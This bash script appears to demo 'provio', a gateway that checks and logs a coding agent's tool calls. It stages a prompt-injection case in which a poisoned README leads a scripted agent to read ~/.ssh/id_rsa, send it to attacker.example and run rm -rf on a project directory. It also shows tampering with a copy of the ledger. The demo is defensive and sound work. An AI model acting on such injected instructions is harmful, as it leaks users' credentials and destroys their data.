#!/usr/bin/env bash
# ---------------------------------------------------------------------------
# provio attack demo — offline, reproducible, no API key.
#
# A coding agent reads a poisoned README (fixture-repo/README.md) whose hidden
# comment tells it to exfiltrate an SSH key and delete a directory. The agent's
# tool-call CHOICES are scripted (the JSON payloads in ./calls/), exactly as
# Claude Code would emit them to a PreToolUse/PostToolUse hook. Everything provio
# does — the decisions, the ledger records, verify — is REAL: each payload is
# fed to the real `provio` binary through `provio check --format claude-code`, the
# same gateway Claude Code calls before every tool runs.
#
#   ./run.sh              uses `provio` from PATH
#   PROVIO_BIN=/path/provio ./run.sh   uses a specific binary
# ---------------------------------------------------------------------------
set -euo pipefail

cd "$(dirname "$0")"

PROVIO="${PROVIO_BIN:-provio}"
POLICY="provio.yaml"
LEDGER=".provio/ledger.jsonl"

if ! command -v "$PROVIO" >/dev/null 2>&1 && [ ! -x "$PROVIO" ]; then
  echo "error: provio binary not found. Install it (pip install provio) or set PROVIO_BIN=/path/to/provio." >&2
  exit 1
fi

# --- colours (disabled if not a tty) ---------------------------------------
if [ -t 1 ]; then
  B=$'\033[1m'; DIM=$'\033[2m'; GRN=$'\033[32m'; RED=$'\033[31m'; YEL=$'\033[33m'; CYN=$'\033[36m'; RST=$'\033[0m'
else
  B=""; DIM=""; GRN=""; RED=""; YEL=""; CYN=""; RST=""
fi

rule() { printf "${DIM}%s${RST}\n" "----------------------------------------------------------------------"; }

# Fresh ledger each run so the demo is deterministic.
rm -rf .provio
mkdir -p .provio

echo
echo "${B}provio attack demo${RST}  ${DIM}·${RST}  $("$PROVIO" --version)"
echo "${DIM}An injected README tells the agent to steal a key and delete a directory.${RST}"
echo "${DIM}The agent's tool calls are scripted; provio's decisions and ledger are real.${RST}"
rule

# label | payload file : the label is what the (scripted) agent tried; the
# verdict below always comes from provio.
STEPS=(
  "read the project README (this pulls the injection into context)|calls/01-read-readme.json"
  "the read completes — poisoned text now in the model's context|calls/02-read-readme-complete.json"
  "act on the injection: read ~/.ssh/id_rsa|calls/03-read-id_rsa.json"
  "exfiltrate it: WebFetch https://attacker.example/collect|calls/04-exfil-http.json"
  "cover tracks: rm -rf /home/dev/project|calls/05-bash-rmrf.json"
)

n=0
for step in "${STEPS[@]}"; do
  n=$((n+1))
  label="${step%%|*}"
  file="${step##*|}"
  printf "${B}[%d]${RST} agent → %s\n" "$n" "$label"

  # Feed the scripted hook payload to the real gateway.
  out="$(printf '%s' "$(cat "$file")" | "$PROVIO" check --format claude-code --policy "$POLICY" --ledger "$LEDGER" 2>/dev/null || true)"

  decision="$(printf '%s' "$out" | sed -n 's/.*"permissionDecision":"\([a-z]*\)".*/\1/p')"
  reason="$(printf '%s' "$out" | sed -n 's/.*"permissionDecisionReason":"\(.*\)"}}/\1/p' | sed 's/\\"/"/g')"

  case "$decision" in
    allow)  printf "    ${GRN}✓ ALLOW${RST}  %s\n" "$reason" ;;
    deny)   printf "    ${RED}✗ DENY${RST}   %s\n" "$reason" ;;
    "")     printf "    ${CYN}• recorded${RST}  execution written to the ledger\n" ;;
    *)      printf "    ${YEL}? %s${RST}  %s\n" "$decision" "$reason" ;;
  esac
  echo
done

rule
echo "${B}provio log${RST}  ${DIM}— what the agent actually did${RST}"
"$PROVIO" log --ledger "$LEDGER"
echo

echo "${B}provio verify${RST}  ${DIM}— is the record intact?${RST}"
"$PROVIO" verify --ledger "$LEDGER"
echo
rule

# Tamper demonstration — on a COPY, so the real ledger is left intact.
echo "${B}Now someone edits the evidence${RST} ${DIM}(on a copy of the ledger)${RST}"
cp "$LEDGER" .provio/ledger.tampered.jsonl
# Rewrite the denied rm -rf into a harmless ls in the copied record.
sed -i 's#rm -rf /home/dev/project#ls -la#' .provio/ledger.tampered.jsonl
echo "${DIM}\$ sed -i 's#rm -rf ...#ls -la#' .provio/ledger.tampered.jsonl${RST}"
echo "${B}provio verify${RST} --ledger .provio/ledger.tampered.jsonl"
if "$PROVIO" verify --ledger .provio/ledger.tampered.jsonl; then
  echo "${RED}(unexpected: the tamper was not caught)${RST}"
else
  :
fi
echo
echo "${DIM}The chain named the exact record that was altered. Nothing was leaked,${RST}"
echo "${DIM}nothing was deleted, and the attempt is on the record.${RST}"
